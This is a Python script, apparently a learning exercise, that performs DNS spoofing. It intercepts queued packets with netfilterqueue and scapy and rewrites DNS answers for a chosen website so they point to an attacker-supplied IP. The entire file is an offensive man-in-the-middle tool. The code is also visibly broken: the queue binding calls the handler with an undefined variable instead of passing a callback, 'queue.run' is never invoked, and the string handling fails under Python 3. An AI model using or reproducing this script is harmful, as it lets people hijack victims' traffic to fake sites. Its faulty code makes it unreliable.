import netfilterqueue
import scapy.all as scapy
import argparse

def get_arguments():
	parser=argparse.ArgumentParser()
	parser.add_argument("-t","--target_website",dest="target_website",help="website to spoof")
	parser.add_argument("-s","--spoof_ip",dest="spoof_ip",help="ip to redirect to the desired website")
	options=parser.parse_args()
	if not options.target_website:
		parser.error("please provide target_website")
	if not options.spoof_ip:
		parser.error("please specify the ip to spoof to desired website")
	return options

def process_packet(packet,target_website,spoof_ip):
	scapy_packet=scapy.IP(packet.get_payload())
	if scapy_packet.haslayer(scapy.DNSRR):
		qname=scapy_packet[scapy.DNSQR].qname
		if target_website in qname:
			print("Spoofing target")
			answer=scapy.DNSRR(rrname=qname,rdata=spoof_ip)
			scapy_packet[scapy.DNS].an=answer
			scapy_packet[scapy.DNS].ancount=1

			del scapy_packet[scapy.IP].len
			del scapy_packet[scapy.IP].chksum
			del scapy_packet[scapy.UDP].len
			del scapy_packet[scapy.UDP].chksum

			packet.set_payload(str(scapy_packet))
	packet.accept()

options=get_arguments()
queue=netfilterqueue.NetfilterQueue()
queue.bind(0,process_packet(packet,options.target_website,options.spoof_ip))
queue.run